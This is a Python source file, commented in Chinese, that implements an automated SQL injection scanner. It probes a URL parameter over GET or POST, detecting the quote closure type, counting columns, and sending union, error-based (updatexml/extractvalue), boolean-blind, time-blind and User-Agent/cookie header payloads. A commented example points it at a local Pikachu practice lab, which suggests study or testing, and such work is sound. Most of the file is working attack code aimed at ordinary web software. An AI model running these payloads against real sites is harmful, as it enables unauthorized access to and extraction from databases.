import requests
import datetime
import glo
# coding:utf-8
import re
# 检索闭合方式
class Vulnerability:
    header = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Length": "42",
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37"
    }

    def __init__(self, url, id, column, method, value='0', cookie=''):
        self.id = id
        self.union = [0, 0]
        self.column = column
        self.method = method
        self.value = value
        self.cookie = cookie
        if (method == "get"):
            self.url = url + '?' + id + '='+value
        else:
            self.url = url
        self.i = 0
        self.e = 0
        self.listClose = ["", "'", '"', "%'", "')", '")', "'))", '"))', '\'"']
        self.exegesis = ["#", "%23", "--+", " or"]

    def prints(self, key, value):
        answer = glo.get_answer()
        answer += key
        answer += '：'
        answer += value
        answer += '\n'
        glo.set_answer(answer)
        glo.set_sqlIngection(key, value)

    def getClosed(self):
        bugName = "闭合类型"
        glo.set_infor('bugName', bugName)
        degree = '0'
        glo.set_infor('degree', degree)
        for e in range(0, 4):
            for i in range(0, 9):
                if e == 3:
                    x = self.url + self.listClose[i] + ' order by 99999' +  self.exegesis[e] + self.listClose[i] + self.column
                    r = requests.get(x)  # %23 <==> --+
                    if 'column' in r.text:
                        self.i = i
                        self.e = e
                        self.exegesis[e] += self.listClose[i]
                        return True
                    rr = requests.get(self.url)
                    r = requests.get(self.url + self.listClose[i] + 'or 1=1' + self.column)
                    rs = requests.get(self.url + self.listClose[i] + 'or 1=1 or' + self.listClose[i] + self.column)  # %23 <==> --+
                    if (r.text != rs.text) and not ('error' in rs.text) and (rs.text != rr.text):
                        self.i = i
                        self.e = e
                        self.exegesis[e] += self.listClose[i]
                        return False
                else:
                    x = self.url + self.listClose[i] + ' order by 99999' + self.exegesis[e] + self.column
                    print(x)    # http://127.0.0.1?name=0 order by 99999#&submit=查询
                    r = requests.get(x)  # %23 <==> --+
                    if 'column' in r.text:
                        self.i = i
                        self.e = e
                        return True
                    rr = requests.get(self.url)
                    r = requests.get(self.url + self.listClose[i] + 'or 1=1' + self.column)
                    rs = requests.get(self.url + self.listClose[i] + 'or 1=1' + self.exegesis[e] + self.column)  # %23 <==> --+
                    if (r.text != rs.text) and not ('error' in rs.text) and (rs.text != rr.text):
                        self.i = i
                        self.e = e
                        return False
                    if self.value != '0':
                        rr = requests.get(self.url)
                        r = requests.get(self.url + self.listClose[i] + 'and 1=1' + self.column)
                        rs = requests.get(self.url + self.listClose[i] + 'and 1=1' + self.exegesis[e] + self.column)  # %23 <==> --+
                        if (r.text != rs.text) and not ('error' in rs.text) and (rs.text != rr.text):
                            self.i = i
                            self.e = e
                            return False

        return False

    def postClosed(self):
        bugName = "闭合类型"
        degree = '0'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        for e in range(0, 4):
            for i in range(0, 9):
                print(e)
                if e == 3:
                    post1 = {
                        f"{self.id}": f"{self.value}{self.listClose[i]} order by 99999{self.exegesis[e]}{self.listClose[i]}",
                    }
                    post1.update(self.column)
                    r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
                    if 'column' in r.text:
                        self.i = i
                        self.e = e
                        self.exegesis[e] += self.listClose[i]
                        return True
                    post1 = {
                        f"{self.id}": f"{self.value}{self.listClose[i]} or 1=1",
                    }
                    post1.update(self.column)
                    r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
                    post1 = {
                        f"{self.id}": f"{self.value}{self.listClose[i]} or 1=1{self.exegesis[e]}{self.listClose[i]}",
                    }
                    post1.update(self.column)
                    rs = requests.post(self.url, headers=self.header, data=post1)
                    if (r.text != rs.text) and not ('error' in rs.text):
                        self.i = i
                        self.e = e
                        self.exegesis[e] += self.listClose[i]
                        return False
                else:
                    post1 = {
                        f"{self.id}": f"{self.value}{self.listClose[i]} order by 99999{self.exegesis[e]}",
                    }
                    post1.update(self.column)
                    r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
                    if 'column' in r.text:
                        self.i = i
                        self.e = e
                        print(self.url, post1, self.listClose[i])
                        return True
                    post1 = {
                        f"{self.id}": f"{self.value}{self.listClose[i]} or 1=1",
                    }
                    post1.update(self.column)
                    r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
                    post1 = {
                        f"{self.id}": f"{self.value}{self.listClose[i]} or 1=1{self.exegesis[e]}",
                    }
                    post1.update(self.column)
                    rs = requests.post(self.url, headers=self.header, data=post1)
                    print(self.url, post1)
                    if (r.text != rs.text) and not ('error' in rs.text):
                        self.i = i
                        self.e = e
                        return False
        return False

    # 获取数据库名长度
    def getUnionSQL(self):
        bugName = "联合注入"
        degree = '0.2'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        j = 0
        for j in range(1, 50):
            payload1 = self.listClose[self.i] + ''' order by %d''' % j
            r1 = requests.get(self.url + payload1 + self.exegesis[self.e] + self.column)  # %23 <==> --+
            print(self.url + payload1 + self.exegesis[self.e] + self.column)
            if 'column' in r1.text:
                print('测试语句：', payload1+ self.exegesis[self.e])
                print('字段数：', j - 1)
                self.union[0] = j-1
                self.prints('测试语句', payload1 + self.exegesis[self.e])
                self.prints('字段数', str(j-1))
                s = ""
                for k in range(1, j):
                    x = k
                    s1 = "%d" % x
                    s1 = f"'***{s1}***'"
                    if (k == j - 1):
                        s = s + s1
                    else:
                        s = s + s1 + ","
                break
        payload2 = "0" + self.listClose[self.i] + ''' union select ''' + s
        r2 = requests.get(self.url + payload2 + self.exegesis[self.e] + self.column)  # %23 <==> --+
        r = r"\*{3}([^,]*?)\*{3}"
        unionList = re.findall(r, r2.text)
        for i in range(len(unionList)):
            unionList[i] = str(unionList[i])
            # unionList[i] = int(unionList[i])
            print(unionList[i])
            # self.prints(unionList[i])
            if (self.i > 0):
                print('字符型联合注入,测试语句：', payload2 + self.exegesis[self.e])
                print('回显位：', unionList[i])
                self.prints('字符型联合注入,测试语句', payload2 + self.exegesis[self.e])
                self.prints('回显位', str(unionList[i]))
                break
            else:
                print('数字型联合注入,测试语句：', payload2 + self.exegesis[self.e])
                print('回显位：', unionList[i])
                self.prints('数字型联合注入,测试语句', payload2 + self.exegesis[self.e])
                self.prints('回显位 ', str(unionList[i]))
                break
        if len(unionList) > 0:
            self.union[1] = int(unionList[0])
        print(self.union)

    def postUnionSQL(self):
        bugName = "联合注入"
        degree = '0.2'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        j = 0
        payload = self.value + self.listClose[self.i]
        for j in range(1, 50):
            post1 = {
                f"{self.id}": f"{payload} order by {j}" + self.exegesis[self.e],
            }
            post1.update(self.column)
            r1 = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
            if 'column' in r1.text:
                print('测试语句：', f"{payload} order by {j}{self.exegesis[self.e]}")
                print('字段数：', j - 1)
                self.union[0] = j - 1
                self.prints('测试语句', f"{payload} order by {j}{self.exegesis[self.e]}")
                self.prints('字段数', str(j - 1))
                s = ""
                for k in range(1, j):
                    x = k
                    s1 = "%d" % x
                    s1 = f"'***{s1}***'"
                    if (k == j - 1):
                        s = s + s1
                    else:
                        s = s + s1 + ","
                break
        post1 = {
            f"{self.id}": f"{payload} union select " + s + self.exegesis[self.e],
        }
        post1.update(self.column)
        print(post1)
        r2 = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
        r = r"\*{3}([^,]*?)\*{3}"
        unionList = re.findall(r, r2.text)
        for i in range(len(unionList)):
            unionList[i] = str(unionList[i])
            # unionList[i] = int(unionList[i])
            print(unionList[i])
            # self.prints(unionList[i])
            if (self.i > 0):
                print('字符型联合注入,测试语句：', f"{payload} union select " + s + self.exegesis[self.e])
                print('回显位：', unionList[i])
                self.prints('字符型联合注入,测试语句', f"{payload} union select " + s + self.exegesis[self.e])
                self.prints('回显位', str(unionList[i]))
                break
            else:
                print('数字型联合注入,测试语句：', f"{payload} union select " + s + self.exegesis[self.e])
                print('回显位：', unionList[i])
                self.prints('数字型联合注入,测试语句', f"{payload} union select " + s + self.exegesis[self.e])
                self.prints('回显位 ', str(unionList[i]))
                break
        if len(unionList) > 0:
            self.union[1] = int(unionList[0])

    def getErrorSQL(self):
        bugName = "报错注入"
        degree = '0.4'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        payload3 = self.listClose[self.i] + ''' and updatexml(1,concat(0x7e,(select database()),0x7e),1)'''
        payload4 = self.listClose[self.i] + ''' and extractvalue(1,concat(0x7e,database(),0x7e))'''
        if self.e == 3:
            r3 = requests.get(self.url + payload3 + self.exegesis[self.e] + self.listClose[self.i] + self.column)  # %23 <==> --+
            r4 = requests.get(self.url + payload4 + self.exegesis[self.e] + self.listClose[self.i] + self.column)  # %23 <==> --+
        else:
            r3 = requests.get(self.url + payload3 + self.exegesis[self.e] + self.column )  # %23 <==> --+
            r4 = requests.get(self.url + payload4 + self.exegesis[self.e] + self.column)  # %23 <==> --+
        if ('syntax' in r3.text) and ('~' in r3.text):
            if (self.i > 0):
                print('字符型报错注入,测试语句：', payload3 + self.exegesis[self.e])
                self.prints('字符型报错注入,测试语句', payload3 + self.exegesis[self.e])
            else:
                print('数字型报错注入,测试语句：', payload3 + self.exegesis[self.e])
                self.prints('数字型报错注入,测试语句', payload3 + self.exegesis[self.e])
        elif ('syntax' in r4.text) and ('~' in r4.text):
            if (self.i > 0):
                print('字符型报错注入,测试语句：', payload4 + self.exegesis[self.e])
                self.prints('字符型报错注入,测试语句', payload4 + self.exegesis[self.e])
            else:
                print('数字型报错注入,测试语句：', payload4 + self.exegesis[self.e])
                self.prints('数字型报错注入,测试语句', payload4 + self.exegesis[self.e])

    def postErrorSQL(self):
        bugName = "报错注入"
        degree = '0.4'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        payload = self.value + self.listClose[self.i]
        post1 = {
            f"{self.id}": f"{payload} and updatexml(1,concat(0x7e,(select database()),0x7e),1)" + self.exegesis[self.e],
        }
        post2 = {
            f"{self.id}": f"{payload} and extractvalue(1,concat(0x7e,database(),0x7e))" + self.exegesis[self.e],
        }
        post1.update(self.column)
        post2.update(self.column)
        r3 = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
        r4 = requests.post(self.url, headers=self.header, data=post2)  # %23 <==> --+
        if ('syntax' in r3.text) and ('~' in r3.text):
            if (self.i > 0):
                print('字符型报错注入,测试语句：', f"{payload} and updatexml(1,concat(0x7e,(select database()),0x7e),1){self.exegesis[self.e]}")
                self.prints('字符型报错注入,测试语句', f"{payload} and updatexml(1,concat(0x7e,(select database()),0x7e),1){self.exegesis[self.e]}")
            else:
                print('数字型报错注入,测试语句：', f"{payload} and updatexml(1,concat(0x7e,(select database()),0x7e),1){self.exegesis[self.e]}")
                self.prints('数字型报错注入,测试语句', f"{payload} and updatexml(1,concat(0x7e,(select database()),0x7e),1){self.exegesis[self.e]}")
        elif ('syntax' in r4.text) and ('~' in r4.text):
            if (self.i > 0):
                print('字符型报错注入,测试语句：', f"{payload} and extractvalue(1,concat(0x7e,database(),0x7e)){self.exegesis[self.e]}")
                self.prints('字符型报错注入,测试语句', f"{payload} and extractvalue(1,concat(0x7e,database(),0x7e)){self.exegesis[self.e]}")
            else:
                print('数字型报错注入,测试语句：', f"{payload} and extractvalue(1,concat(0x7e,database(),0x7e)){self.exegesis[self.e]}")
                self.prints('数字型报错注入,测试语句', f"{payload} and extractvalue(1,concat(0x7e,database(),0x7e)){self.exegesis[self.e]}")

    def getBleanBlindSQL(self):
        bugName = "布尔盲注"
        degree = '0.6'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        payload1 = self.listClose[self.i] + ''' or length(database())>0'''
        payload2 = self.listClose[self.i] + ''' or length(database())<0'''
        r1 = requests.get(self.url + payload1 + self.exegesis[self.e] + self.column)  # %23 <==> --+
        r2 = requests.get(self.url + payload2 + self.exegesis[self.e] + self.column)  # %23 <==> --+
        if (r1.text != r2.text):
            if (self.i > 0):
                print('字符型布尔盲注，测试语句：', payload1 + self.exegesis[self.e])
                print(payload2 + self.exegesis[self.e])
                self.prints('字符型布尔盲注，测试语句1', payload1 + self.exegesis[self.e])
                self.prints('字符型布尔盲注，测试语句2',payload2 + self.exegesis[self.e])
            else:
                print('数字型布尔注入，测试语句：', payload1 + self.exegesis[self.e])
                print(payload2 + self.exegesis[self.e])
                self.prints('数字型布尔注入，测试语句1', payload1 + self.exegesis[self.e])
                self.prints('数字型布尔注入，测试语句2',payload2 + self.exegesis[self.e])
        if self.value != '0':
            payload1 = self.listClose[self.i] + ''' and length(database())>0'''
            payload2 = self.listClose[self.i] + ''' and length(database())<0'''
            r1 = requests.get(self.url + payload1 + self.exegesis[self.e] + self.column)  # %23 <==> --+
            r2 = requests.get(self.url + payload2 + self.exegesis[self.e] + self.column)  # %23 <==> --+
            if (r1.text != r2.text):
                if (self.i > 0):
                    print('字符型布尔盲注，测试语句：', payload1 + self.exegesis[self.e])
                    print(payload2 + self.exegesis[self.e])
                    self.prints('字符型布尔盲注，测试语句1', payload1 + self.exegesis[self.e])
                    self.prints('字符型布尔盲注，测试语句2', payload2 + self.exegesis[self.e])
                else:
                    print('数字型布尔注入，测试语句：', payload1 + self.exegesis[self.e])
                    print(payload2 + self.exegesis[self.e])
                    self.prints('数字型布尔注入，测试语句1', payload1 + self.exegesis[self.e])
                    self.prints('数字型布尔注入，测试语句2',payload2 + self.exegesis[self.e])

    def postBleanBlindSQL(self):
        bugName = "布尔盲注"
        degree = '0.6'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        payload = self.value + self.listClose[self.i]
        post1 = {
            f"{self.id}": f"{payload} or length(database())>0{self.exegesis[self.e]}",
        }
        post2 = {
            f"{self.id}": f"{payload} or length(database())<0{self.exegesis[self.e]}",
        }
        post1.update(self.column)
        post2.update(self.column)
        r1 = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
        r2 = requests.post(self.url, headers=self.header, data=post2)  # %23 <==> --+
        if (r1.text != r2.text):
            if (self.i > 0):
                print('字符型布尔盲注，测试语句：', f"{payload} or length(database())>0{self.exegesis[self.e]}")
                print(f"{payload} or length(database())<0{self.exegesis[self.e]}")
                self.prints('字符型布尔盲注，测试语句1', f"{payload} or length(database())>0{self.exegesis[self.e]}")
                self.prints('字符型布尔盲注，测试语句2',f"{payload} or length(database())<0{self.exegesis[self.e]}")
            else:
                print('数字型布尔注入，测试语句：', f"{payload} or length(database())>0{self.exegesis[self.e]}")
                print(f"{payload} or length(database())<0{self.exegesis[self.e]}")
                self.prints('数字型布尔注入，测试语句1', f"{payload} or length(database())>0{self.exegesis[self.e]}")
                self.prints('数字型布尔注入，测试语句2', f"{payload} or length(database())<0{self.exegesis[self.e]}")
            print(glo.get_sqlIngection('数字型布尔盲注，测试语句1'))

    def getTimeBlindSQL(self):
        bugName = "时间盲注"
        degree = '0.8'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        for e in range(0,4):
            for i in range(0, 9):
                if e==3:
                    self.exegesis[e]=' or'+self.listClose[i]
                payload = self.listClose[i] + ''' or if(length(database())>0,sleep(3),1)''' + self.exegesis[e]
                time1 = datetime.datetime.now()
                requests.get(self.url + payload + self.column)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 3:
                    if (self.i > 0):
                        print('字符型时间盲注，测试语句：', payload)
                        self.prints('字符型时间盲注，测试语句', payload)
                    else:
                        print('数字型时间盲注，测试语句：', payload)
                        self.prints('数字型时间盲注，测试语句', payload)

    def postTimeBlindSQL(self):
        bugName = "时间盲注"
        degree = '0.8'
        glo.set_infor('bugName', bugName)
        glo.set_infor('degree', degree)
        for e in range(0,4):
            for i in range(0, 9):
                if e==3:
                        self.exegesis[e]=' or'+self.listClose[i]
                post1 = {
                    f"{self.id}": f"{self.value}{self.listClose[i]} or if(length(database())>0,sleep(3),1){self.exegesis[e]}",
                }
                post1.update(self.column)
                time1 = datetime.datetime.now()
                requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 3:
                    if (i > 0):
                        print('字符型时间盲注，测试语句：', f"{self.listClose[i]} or if(length(database())>0,sleep(3),1){self.exegesis[self.e]}")
                        self.prints('字符型时间盲注，测试语句', f"{self.listClose[i]} or if(length(database())>0,sleep(3),1){self.exegesis[self.e]}")
                        return
                    else:
                        print('数字型时间盲注，测试语句：', f"{self.listClose[i]} or if(length(database())>0,sleep(3),1){self.exegesis[self.e]}")
                        self.prints('数字型时间盲注，测试语句', f"{self.listClose[i]} or if(length(database())>0,sleep(3),1){self.exegesis[self.e]}")
                        return

    def httpHeaderUser(self):
        for i in range(0, 9):
            payload = self.listClose[i]
            temp = payload + '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '''+payload
            self.header['User-Agent'] = temp
            post1 = {
                f"{self.id}": f"{self.value}",
            }
            post1.update(self.column)
            r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
            if ('syntax' in r.text) and ('~' in r.text):
                if (i > 0):
                    print('字符型httpheader注入,测试语句：',  payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',payload)
                    self.prints('字符型httpheader注入,测试语句',  payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',payload)
                else:
                    print('数字型httpheader注入,测试语句：',  payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',payload)
                    self.prints('数字型httpheader注入,测试语句',  payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',payload)
            else:
                temp = payload + "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " + payload
                self.header['User-Agent'] = temp
                post1 = {
                    f"{self.id}": f"{self.value}",
                }
                post1.update(self.column)
                r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
                if ('syntax' in r.text) and ('~' in r.text):
                    if (i > 0):
                        print('字符型httpheader注入,测试语句：', payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , payload)
                        self.prints('字符型httpheader注入,测试语句', payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , payload)
                    else:
                        print('数字型httpheader注入,测试语句：', payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , payload)
                        self.prints('数字型httpheader注入,测试语句', payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , payload)

    def httpHeaderCookie(self):
        for i in range(0, 9):
            payload = self.cookie + self.listClose[i]
            temp = payload + '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''' + self.listClose[i]
            self.header['cookie'] = temp
            post1 = {
                f"{self.id}": f"{self.value}",
            }
            r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
            if ('syntax' in r.text) and ('~' in r.text):
                if (i > 0):
                    print('字符型cookie注入,测试语句：', payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',self.listClose[i])
                    self.prints('字符型cookie注入,测试语句', payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',self.listClose[i])
                else:
                    print('数字型cookie注入,测试语句：', payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',self.listClose[i])
                    self.prints('数字型cookie注入,测试语句', payload , '''and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ''',self.listClose[i])
            else:
                temp = payload + "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " + self.listClose[i]
                self.header['cookie'] = temp
                post1 = {
                    f"{self.id}": f"{self.value}",
                }
                r = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
                if ('syntax' in r.text) and ('~' in r.text):
                    if (i > 0):
                        print('字符型cookie注入,测试语句：', payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , self.listClose[i])
                        self.prints('字符型cookie注入,测试语句', payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , self.listClose[i])
                    else:
                        print('数字型cookie注入,测试语句：',  payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , self.listClose[i])
                        self.prints('数字型cookie注入,测试语句',  payload , "and extractvalue(1,concat(0x7e,(select database()),0x7e)) and " , self.listClose[i])


    def runGet(self):
        if (self.getClosed()):
            self.getUnionSQL()
        self.getErrorSQL()
        self.getBleanBlindSQL()
        # self.getTimeBlindSQL()

    def runPost(self):
        if (self.postClosed()):
            self.postUnionSQL()
        if (self.i != -1):
            self.postErrorSQL()
            self.postBleanBlindSQL()
        # self.postTimeBlindSQL()

    def run(self):
        glo.answer = 'start\n'
        if(self.method != "post"):
            self.runGet()
        else:
            self.runPost()
        glo.answer += 'end'
        glo.set_infor('degree', '1')
        # self.httpHeaderUser()
        # self.httpHeaderCookie()



# # column0 = ''
# # column1 = {'passwd': "1", 'submit': 'Submit'}
# # column2 = {'password': '1', 'sex': '', 'phonenum': '', 'email': '', 'add': "", 'submit': 'submit'}
# column3 = '&submit=查询'
# column4 = {'submit': '%E6%9F%A5%E8%AF%A2'}
# v1 = Vulnerability("http://127.0.0.1/pikachu/vul/sqli/sqli_id.php", "id", column4, "post")
# v1.run()
